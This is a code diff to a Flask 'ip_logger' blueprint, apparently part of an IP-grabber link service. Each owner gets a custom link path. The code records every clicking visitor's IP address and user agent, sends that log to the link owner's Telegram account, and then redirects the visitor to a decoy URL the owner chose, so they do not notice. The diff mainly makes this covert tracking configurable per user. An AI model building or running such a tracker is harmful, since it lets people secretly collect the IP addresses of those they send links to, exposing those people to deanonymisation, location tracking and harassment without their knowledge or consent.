@@ -1,11 +1,9 @@
 import time
-from typing import Dict
 
 from flask import Blueprint, request, render_template, redirect
 
-from app.logger.utilities import LoggerLog
-
-ips: Dict[str, LoggerLog] = dict()
+from utilities import LoggerLog
+from app.database.crud import get_user_by_address
 
 bp = Blueprint(
     "ip_logger",
@@ -13,28 +11,35 @@ bp = Blueprint(
     template_folder="../../templates"
 )
 
+ips: dict[str, LoggerLog] = dict()
 
-@bp.route("/<int:tg_user_id>")
-def logger(tg_user_id: int):
+
+@bp.route("/<regex('^[^_]\\w+[^_]$'):path>")
+def logger(path: str):
     if request.environ.get("HTTP_X_FORWARDED_FOR"):
         ip = request.environ["HTTP_X_FORWARDED_FOR"].split(",")[-1].strip()
     else:
         ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)
+
     print("first: ", ip)
     print("header", request.environ.get("HTTP_X_FORWARDED_FOR"))
+
+    if (tg_user := get_user_by_address(path)) is None:
+        return "Not found", 404
+
     if ips.get(ip) is None:
-        ips[ip] = LoggerLog(ip_address=ip, receiver_tg_id=tg_user_id, user_agent=request.user_agent.string)
+        ips[ip] = LoggerLog(ip_address=ip, receiver_tg_id=tg_user.id, user_agent=request.user_agent.string)
 
     elif time.time() - ips[ip].last_response <= 60:
-        return redirect("https://google.com")
+        return redirect(tg_user.redirect_url)
     else:
         ips[ip].last_response = time.time()
-        ips[ip].receiver_tg_id = tg_user_id
+        ips[ip].receiver_tg_id = tg_user.id
 
     ips[ip].last_response = time.time()
     ips[ip].send_message(ips[ip].get_main_log())
 
-    return render_template("index.html")
+    return render_template("index.html", redirect=tg_user.redirect_url)
 
 
 @bp.route("/addlog", methods=['POST'])
